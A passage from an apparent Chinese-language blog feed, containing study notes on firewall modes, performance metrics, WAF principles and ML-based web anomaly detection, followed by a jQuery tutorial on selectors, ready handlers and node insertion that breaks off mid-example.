class="headerlink" title="透明接入模式"></a>透明接入模式</h3><ul><li><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120092224106.png" alt="image-20231120092224106"></p></li><li><p>交换机 简单的路由转发</p></li></ul></li><li><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><ul><li>◆工作于透明接入模式的防火墙可以实现透明接入。</li><li>◆工作于路由模式的防火墙可以实现不同网段的连接。</li><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120092431863.png" alt="image-20231120092431863"></li></ul></li></ul><h2 id="5-企业防火墙的典型部署"><a href="#5-企业防火墙的典型部署" class="headerlink" title="5. 企业防火墙的典型部署"></a>5. 企业防火墙的典型部署</h2><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120093012798.png" alt="image-20231120093012798"></p><h2 id="6-衡量防火墙性能五大指标"><a href="#6-衡量防火墙性能五大指标" class="headerlink" title="6. 衡量防火墙性能五大指标"></a>6. 衡量防火墙性能五大指标</h2><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120093438516.png" alt="image-20231120093438516"></p><ul><li><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><ul><li>定义：在不丢包的情况下能够达到的最大速率</li><li>越高越好</li></ul></li><li><h4 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h4><ul><li>入口处输入帧&#x3D;&#x3D;最后1个比特到达&#x3D;&#x3D;至出口处输出帧的&#x3D;&#x3D;第一个比特输出&#x3D;&#x3D;所用的时间间隔</li><li>越小越好</li></ul></li><li><h4 id="丢包率"><a href="#丢包率" class="headerlink" title="丢包率"></a>丢包率</h4><ul><li>定义：在连续负载的情况下，防火墙设备由于资源不 足应转发但却未转发的帧百分比</li><li>越小越好</li></ul></li><li><h4 id="背靠背"><a href="#背靠背" class="headerlink" title="背靠背"></a>背靠背</h4><ul><li>定义：从空闲状态开始，以达到传输介质最小合法间 隔极限的传输速率发送相当数量的固定长度的帧，当 出现第一个帧丢失时，发送的帧数。</li><li>衡量缓冲容量的大小</li><li>应对突发数据的能力</li></ul></li><li><h4 id="并发连接数"><a href="#并发连接数" class="headerlink" title="并发连接数"></a>并发连接数</h4><ul><li>定义：指数据包穿越防火墙时同时建立的最大连接数。</li></ul></li></ul><h2 id="5-弱点和局限性"><a href="#5-弱点和局限性" class="headerlink" title="5.弱点和局限性"></a>5.弱点和局限性</h2><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120094429157.png" alt="image-20231120094429157"></p><p><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120094444918.png" alt="image-20231120094444918"></p><h2 id="6-争论"><a href="#6-争论" class="headerlink" title="6. 争论"></a>6. 争论</h2><ul><li><h3 id="胖瘦："><a href="#胖瘦：" class="headerlink" title="胖瘦："></a>胖瘦：</h3><ul><li>胖：</li><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120094700581.png" alt="image-20231120094700581"></li><li>软件越复杂，暴露的攻击面也多，不稳定也不安全</li><li>瘦：</li><li><img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231120095015413.png" alt="image-20231120095015413"></li></ul></li><li><p>硬件架构</p></li><li><p>❖基于X86体系的通用CPU架构</p><ul><li>软件形态</li><li>基于X86架构防火墙的处理速度和能力能够很好的适应各种百兆网 络环境和一般千兆网络环境的需求； ❖ 基于X86防火墙由于受CPU处理能力和PCI总线的制约，在更高的千 兆环境下其性能和功能则日益不能满足于需求</li></ul></li><li><p>❖基于网络处理器的NPU架构</p></li><li><p>网络处理器NPU则是&#x3D;&#x3D;专门为处理数据包而设计&#x3D;&#x3D;的可编程处理器，同时，其硬件体 系结构的设计大多采用高速的接口技术和总线规范，具有较高的I&#x2F;O能力；  </p></li><li><p>灵活性差</p></li><li><p>❖基于专用处理芯片的ASIC架构</p><ul><li>传统的ASIC芯片技术的最大不足就是缺乏灵活性，开发难度大。 一旦指令或计算逻辑固化到硬件中，就很难修改升级、增加新的 功能。而且，ASIC设计和制造周期长，研发费用高。 </li><li>❖ 现代的ASIC芯片技术增加了可编程性，从而能够同时满足灵活性 和高性能的要求。从实现功能方面看，ASIC防火墙可以很容易地 集成VPN、内容过滤和防病毒等功能</li></ul></li></ul><h2 id="7-WAF技术"><a href="#7-WAF技术" class="headerlink" title="7. WAF技术"></a>7. WAF技术</h2><ul><li>理解：本质上以一种入侵检测技术，web IPS</li><li>WAF的部署：<ul><li>串行部署：在web服务器之前</li></ul></li><li>WAF的技术原理：<ul><li>双向代理：代理方式防止了入侵者的直接进入，对DDOS攻击可以抑制，对非 预料的“特别”行为也有所抑制，代理方式本身就是一种安全网关</li></ul></li><li>特征识别：<ul><li>特征：攻击者的指纹</li><li>根据应用、行为的特有行为属性，就可以检测异常的行为，病毒与蠕虫的识别就采用此方式</li><li>难点：每种攻击都自己的特征，数量比较庞大，相似度大，细微差别 不易被辨识出来，从而导致误报的可能性也大。</li></ul></li><li><h2 id="算法识别：-检测算法本身根攻击算法强绑定"><a href="#算法识别：-检测算法本身根攻击算法强绑定" class="headerlink" title="算法识别：- 检测算法本身根攻击算法强绑定"></a>算法识别：<br>- 检测算法本身根攻击算法强绑定</h2></li><li>模式匹配<ul><li>把攻击行为 归纳成一定模式，匹配后能确定是入侵行为，当然模 式的定义有一定的难度</li><li>协议模式是其中简单的，是按标准协议的规程来定义 模式；  行为模式匹配，但难度大。</li><li>&#x3D;&#x3D;Web防火墙最大的挑战是识别率&#x3D;&#x3D;</li></ul></li><li>自学习技术的应用<ul><li>建立正常模式：通过一段时间的用户访问，WAF记录了常用网页的 访问模式，如一个网页中有几个输入点，输入的是什么类型的内 容，通常情况的长度是多少等等，在学习完毕后，定义出一个网 页的正常使用模式</li><li>执行：当有用户突破了所定义的正常使用模式，WAF就会根据预先 定义的方式预警或阻断。</li><li>&#x3D;&#x3D;通过对B&#x2F;S端双向流量来学习Web服务的用户行为模式，建立用户正常模型&#x3D;&#x3D;</li></ul></li></ul><h2 id="8-基于机器学习的Web异常检测"><a href="#8-基于机器学习的Web异常检测" class="headerlink" title="8.基于机器学习的Web异常检测"></a>8.基于机器学习的Web异常检测</h2><ul><li>目前大多数Web入侵检测都是基于无监督的学习方法，针对大量正常日 志建立模型(Profile)，而与正常流量不符的则被识别为异常。这个思路 与拦截规则的构造恰恰相反。</li><li>Profile的建立<ul><li>基于单分类模型：可以通过非监督或单分类模型进行样本学习，构造 能够充分表达白样本的最小模型作为Profile，实现异常检测。</li><li>基于聚类模型：通常正常流量是大量重复性存在的，而入侵行为则极为稀少</li><li>基于统计学习模型:</li><li>…</li></ul></li></ul><h2 id="9"><a href="#9" class="headerlink" title="9."></a>9.<img src="/2023/11/17/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/image-20231124092809472.png" alt="image-20231124092809472"></h2>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JQuery</title>
      <link href="/2023/11/15/JQuery/"/>
      <url>/2023/11/15/JQuery/</url>
      
        <content type="html"><![CDATA[<h1 id="JQuery简介"><a href="#JQuery简介" class="headerlink" title="JQuery简介"></a>JQuery简介</h1><h3 id="1-选择元素："><a href="#1-选择元素：" class="headerlink" title="1. 选择元素："></a>1. 选择元素：</h3><h4 id="使用-jQuery："><a href="#使用-jQuery：" class="headerlink" title="使用 jQuery："></a>使用 jQuery：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 通过 ID 获取元素</span><br><span class="line">var myElement = $(&quot;#myElement&quot;);</span><br><span class="line"></span><br><span class="line">// 通过类名获取元素</span><br><span class="line">var elementsByClass = $(&quot;.myClass&quot;);</span><br><span class="line"></span><br><span class="line">// 通过标签名获取元素</span><br><span class="line">var elementsByTag = $(&quot;div&quot;);</span><br></pre></td></tr></table></figure><h4 id="使用原生-JavaScript："><a href="#使用原生-JavaScript：" class="headerlink" title="使用原生 JavaScript："></a>使用原生 JavaScript：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// 通过 ID 获取元素</span></span><br><span class="line"><span class="keyword">var</span> myElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myElement&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过类名获取元素</span></span><br><span class="line"><span class="keyword">var</span> elementsByClass = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;myClass&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过标签名获取元素</span></span><br><span class="line"><span class="keyword">var</span> elementsByTag = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;div&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-修改元素内容、属性和样式："><a href="#2-修改元素内容、属性和样式：" class="headerlink" title="2. 修改元素内容、属性和样式："></a>2. 修改元素内容、属性和样式：</h3><h4 id="使用-jQuery：-1"><a href="#使用-jQuery：-1" class="headerlink" title="使用 jQuery："></a>使用 jQuery：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 修改元素文本内容</span><br><span class="line">myElement.text(&quot;Hello, jQuery!&quot;);</span><br><span class="line"></span><br><span class="line">// 修改元素属性</span><br><span class="line">myElement.attr(&quot;src&quot;, &quot;new-image.jpg&quot;);</span><br><span class="line"></span><br><span class="line">// 修改元素样式</span><br><span class="line">myElement.css(&quot;color&quot;, &quot;red&quot;);</span><br></pre></td></tr></table></figure><h4 id="使用原生-JavaScript：-1"><a href="#使用原生-JavaScript：-1" class="headerlink" title="使用原生 JavaScript："></a>使用原生 JavaScript：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascriptCopy code// 修改元素文本内容</span><br><span class="line">myElement.textContent = &quot;Hello, JavaScript!&quot;;</span><br><span class="line"></span><br><span class="line">// 修改元素属性</span><br><span class="line">myElement.setAttribute(&quot;src&quot;, &quot;new-image.jpg&quot;);</span><br><span class="line"></span><br><span class="line">// 修改元素样式</span><br><span class="line">myElement.style.color = &quot;red&quot;;</span><br></pre></td></tr></table></figure><h2 id="2-准备函数（初始化）"><a href="#2-准备函数（初始化）" class="headerlink" title="2. 准备函数（初始化）"></a>2. 准备函数（初始化）</h2><p><code>ready</code> 函数是 jQuery 提供的一种用于确保文档（DOM）已完全加载的机制。这个函数用于执行在文档加载完成后需要立即执行的代码。在 jQuery 中，<code>ready</code> 函数有两种常见的写法。</p><h3 id="1-使用-document-ready"><a href="#1-使用-document-ready" class="headerlink" title="1. 使用 $(document).ready()"></a>1. 使用 <code>$(document).ready()</code></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy <span class="title function_">code$</span>(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 在文档加载完成后执行的代码</span></span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Document is ready!&quot;</span>);</span><br><span class="line">    <span class="comment">// 可以放置其他需要在文档加载后执行的代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是 <code>ready</code> 函数的传统写法，它确保在文档加载完成后执行回调函数中的代码。</p><h3 id="2-使用简化形式：-function"><a href="#2-使用简化形式：-function" class="headerlink" title="2. 使用简化形式：$(function() {})"></a>2. 使用简化形式：<code>$(function() &#123;&#125;)</code></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy <span class="title function_">code$</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 在文档加载完成后执行的代码</span></span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Document is ready!&quot;</span>);</span><br><span class="line">    <span class="comment">// 可以放置其他需要在文档加载后执行的代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是 <code>$(document).ready()</code> 的简写形式。这种形式更加简洁，但实际上是相同的。</p><p>使用 <code>ready</code> 函数的目的是确保在执行 JavaScript 代码时文档已经完全加载。这对于在 JavaScript 中操作 DOM 元素是很重要的，因为如果在文档没有完全加载时执行操作，可能会导致找不到元素或其他不确定的行为。</p><p>需要注意的是，在现代的 web 开发中，由于浏览器对脚本的异步加载支持较好，很多时候直接将 <code>&lt;script&gt;</code> 标签放在 <code>&lt;body&gt;</code> 标签底部或使用 <code>defer</code> 属性也能达到类似的效果，而不需要显式地使用 <code>ready</code> 函数。然而，<code>ready</code> 函数仍然是一个有用的工具，特别是在处理旧版本的浏览器或在使用一些需要确保 DOM 完全加载的情况下。</p><h3 id="3-对比window-onlodad"><a href="#3-对比window-onlodad" class="headerlink" title="3. 对比window.onlodad"></a>3. 对比window.onlodad</h3><ul><li>window.onload加载这个触发条件是无法叠加的</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  &lt;h1&gt;<span class="title class_">Hello</span> <span class="variable constant_">DOM</span> &lt;/h1&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>onload事件表示网页元素在内存已经产生DOM元素后执行<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title function_">alert</span>(<span class="string">&quot;我是第一个在DOM加载后执行的&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;<span class="comment">//触发不了</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title function_">alert</span>(<span class="string">&quot;虽然是我第二个，但是我才是真正被执行的那个脚本！&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>  </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;<span class="title class_">Hello</span> <span class="variable constant_">DOM</span> &lt;/h1&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>onload事件表示网页元素在内存已经产生DOM元素后执行<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(<span class="string">&quot;我是第一个在DOM加载后执行的&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(<span class="string">&quot;我是第二个被执行的那个脚本！&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>理解：当我引入多个js库时，使用ready事件，不能使用onload事件，因为如果使用onload的话只有最后一个生效</p></blockquote><h1 id="JQuery选择器"><a href="#JQuery选择器" class="headerlink" title="JQuery选择器"></a>JQuery选择器</h1><p>以下是一些常见的 jQuery 选择器：</p><h3 id="1-基本选择器："><a href="#1-基本选择器：" class="headerlink" title="1. 基本选择器："></a>1. 基本选择器：</h3><ul><li><p><strong>元素选择器：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>)  <span class="comment">// 选择所有 &lt;p&gt; 元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>ID 选择器：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;#myId&quot;</span>)  <span class="comment">// 选择 ID 为 &quot;myId&quot; 的元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>类选择器：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;.myClass&quot;</span>)  <span class="comment">// 选择所有类名为 &quot;myClass&quot; 的元素</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-层级选择器："><a href="#2-层级选择器：" class="headerlink" title="2. 层级选择器："></a>2. 层级选择器：</h3><ul><li><p><strong>后代选择器：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;div p&quot;</span>)  <span class="comment">// 选择所有 &lt;p&gt; 元素，其中父元素是 &lt;div&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>子元素选择器：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;ul &gt; li&quot;</span>)  <span class="comment">// 选择所有作为 &lt;ul&gt; 直接子元素的 &lt;li&gt; 元素</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-过滤选择器："><a href="#3-过滤选择器：" class="headerlink" title="3. 过滤选择器："></a>3. 过滤选择器：</h3><ul><li><p><strong>第一个元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;p:first&quot;</span>)  <span class="comment">// 选择第一个 &lt;p&gt; 元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>最后一个元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;p:last&quot;</span>)  <span class="comment">// 选择最后一个 &lt;p&gt; 元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>偶数元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;tr:even&quot;</span>)  <span class="comment">// 选择所有偶数行的 &lt;tr&gt; 元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>奇数元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;tr:odd&quot;</span>)  <span class="comment">// 选择所有奇数行的 &lt;tr&gt; 元素</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-表单元素选择器："><a href="#4-表单元素选择器：" class="headerlink" title="4. 表单元素选择器："></a>4. 表单元素选择器：</h3><ul><li><p><strong>选择输入框：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;:input&quot;</span>)  <span class="comment">// 选择所有输入元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>选择复选框：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;:checkbox&quot;</span>)  <span class="comment">// 选择所有复选框元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>选择被选中的选项：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;:selected&quot;</span>)  <span class="comment">// 选择所有被选中的选项元素</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-属性选择器："><a href="#5-属性选择器：" class="headerlink" title="5. 属性选择器："></a>5. 属性选择器：</h3><ul><li><p><strong>选择具有特定属性的元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;[name=&#x27;username&#x27;]&quot;</span>)  <span class="comment">// 选择所有具有 name 属性且值为 &#x27;username&#x27; 的元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>选择具有某个属性的元素：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">$(<span class="string">&quot;[href]&quot;</span>)  <span class="comment">// 选择所有具有 href 属性的元素</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="6-实例："><a href="#6-实例：" class="headerlink" title="6.实例："></a>6.实例：</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;./js/jquery.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"> <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// ancestor selector</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     $(<span class="string">&quot;body div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;#eebbef&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// son selector</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     $(<span class="string">&quot;div&gt;.mini&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// 后面两种选择器可以方法：next()和nextAll()代替</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// near sibling selctor</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// $(&quot;#one + div&quot;).css(&quot;border&quot;,&quot;brown 5px solid&quot;);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     $(<span class="string">&quot;#one&quot;</span>).<span class="title function_">next</span>(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;border&quot;</span>,<span class="string">&quot;brown 5px solid&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// sibilings selector</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="comment">// $(&quot;#two~div&quot;).css(&quot;border&quot;,&quot;yellowgreen 10px dashed&quot;);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     $(<span class="string">&quot;#two&quot;</span>).<span class="title function_">nextAll</span>(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;border&quot;</span>,<span class="string">&quot;yellowgreen 10px dashed&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="7-实例："><a href="#7-实例：" class="headerlink" title="7. 实例："></a>7. 实例：</h3><p>parent vs parents</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="comment">// parent是指直接父节点</span></span><br><span class="line">       $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">           $(<span class="string">&quot;span&quot;</span>).<span class="title function_">parent</span>().<span class="title function_">css</span>(&#123;</span><br><span class="line">               <span class="string">&quot;color&quot;</span>: <span class="string">&quot;red&quot;</span>,</span><br><span class="line">               <span class="string">&quot;border&quot;</span>: <span class="string">&quot;2px solid red&quot;</span></span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// parents是指所有祖先</span></span><br><span class="line">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $(<span class="string">&quot;span&quot;</span>).<span class="title function_">parents</span>().<span class="title function_">css</span>(&#123;</span><br><span class="line">            <span class="string">&quot;color&quot;</span>: <span class="string">&quot;red&quot;</span>,</span><br><span class="line">            <span class="string">&quot;border&quot;</span>: <span class="string">&quot;2px solid red&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="JQuery对象"><a href="#JQuery对象" class="headerlink" title="JQuery对象"></a>JQuery对象</h1><ul><li><p><strong>jQuery 对象</strong>是一个类似于数组的对象，它包装了一个或多个 DOM 元素，并提供了一组方法来操作这些元素。jQuery 对象是由 jQuery 函数（通常以 <code>$</code> 符号表示）返回的。</p></li><li><h2 id="dom与jQuery的转化"><a href="#dom与jQuery的转化" class="headerlink" title="dom与jQuery的转化"></a>dom与jQuery的转化</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有 &lt;p&gt; 元素的 jQuery 对象</span></span><br><span class="line"><span class="keyword">var</span> allParagraphs = $(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过索引获取第一个 &lt;p&gt; 元素的原生 DOM 对象</span></span><br><span class="line"><span class="keyword">var</span> firstParagraph = allParagraphs[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原生 DOM 对象</span></span><br><span class="line"><span class="keyword">var</span> myElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myElement&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换为 jQuery 对象</span></span><br><span class="line"><span class="keyword">var</span> myElementInjQuery = $(myElement);</span><br></pre></td></tr></table></figure></li><li><h2 id="节点添加"><a href="#节点添加" class="headerlink" title="节点添加"></a>节点添加</h2></li></ul><p>在 jQuery 中，你可以使用一系列的方法来添加、插入、或者追加节点到文档中。以下是几个常用的方法：</p><h3 id="1-append-方法"><a href="#1-append-方法" class="headerlink" title="1. append 方法"></a>1. <code>append</code> 方法</h3><p><code>append</code> 方法用于在指定元素的内部末尾插入内容。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将新的 &lt;p&gt; 元素追加到 &lt;div id=&quot;container&quot;&gt; 元素的内部末尾</span></span><br><span class="line">$(<span class="string">&quot;#container&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;&lt;p&gt;New paragraph&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-prepend-方法"><a href="#2-prepend-方法" class="headerlink" title="2. prepend 方法"></a>2. <code>prepend</code> 方法</h3><p><code>prepend</code> 方法用于在指定元素的内部开头插入内容。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将新的 &lt;p&gt; 元素插入到 &lt;div id=&quot;container&quot;&gt; 元素的内部开头</span></span><br><span class="line">$(<span class="string">&quot;#container&quot;</span>).<span class="title function_">prepend</span>(<span class="string">&quot;&lt;p&gt;New paragraph at the beginning&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-after-方法"><a href="#3-after-方法" class="headerlink" title="3. after 方法"></a>3. <code>after</code> 方法</h3><p><code>after</code> 方法用于在指定元素之后插入内容。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 &lt;div id=&quot;container&quot;&gt; 元素之后插入新的 &lt;p&gt; 元素</span></span><br><span class="line">$(<span class="string">&quot;#container&quot;</span>).<span class="title function_">after</span>(<span class="string">&quot;&lt;p&gt;New paragraph after the container&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="4-before-方法"><a href="#4-before-方法" class="headerlink" title="4. before 方法"></a>4. <code>before</code> 方法</h3><p><code>before</code> 方法用于在指定元素之前插入内容。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 &lt;div id=&quot;container&quot;&gt; 元素之前插入新的 &lt;p&gt; 元素</span></span><br><span class="line">$(<span class="string">&quot;#container&quot;</span>).<span class="title function_">before</span>(<span class="string">&quot;&lt;p&gt;New paragraph before the 